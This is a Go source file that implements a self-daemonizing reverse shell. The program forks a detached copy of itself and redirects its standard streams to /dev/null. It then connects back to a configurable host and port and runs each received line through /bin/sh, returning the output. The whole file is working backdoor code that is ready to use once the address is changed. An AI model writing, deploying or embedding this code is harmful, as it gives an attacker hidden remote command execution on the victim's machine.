package main

import (
	"bufio"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

var (
	// the address to connect back to.
	Rshost = "127.0.0.1"
	// the port to connect back to.
	Rsport = "8080"
)

func doShell() {
	conn, err := net.Dial("tcp", Rshost+":"+Rsport)
	if err != nil {
		return
	}

	reader := bufio.NewReader(conn)
	for {
		userCmd, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		if strings.TrimRight(userCmd, "\n") == "exit" {
			conn.Close()

			return
		}
		cmd := exec.Command("/bin/sh", "-c", userCmd)
		out, _ := cmd.CombinedOutput()
		_, _ = conn.Write(out)
	}
}

func daemonize() {
	if _, err := syscall.Setsid(); err != nil {
		os.Exit(1)
	}

	devNull, err := os.OpenFile("/dev/null", os.O_RDWR, 0)
	if err != nil {
		os.Exit(1)
	}
	_ = syscall.Dup3(int(devNull.Fd()), int(os.Stdin.Fd()), 0)
	_ = syscall.Dup3(int(devNull.Fd()), int(os.Stdout.Fd()), 0)
	_ = syscall.Dup3(int(devNull.Fd()), int(os.Stderr.Fd()), 0)

	doShell()
}

func main() {
	if len(os.Args) > 1 {
		daemonize()

		return
	}

	// just add any old value to indicate that we want to fork
	cmd := exec.Command(os.Args[0], "a")
	_ = cmd.Start()
	os.Exit(0)
}
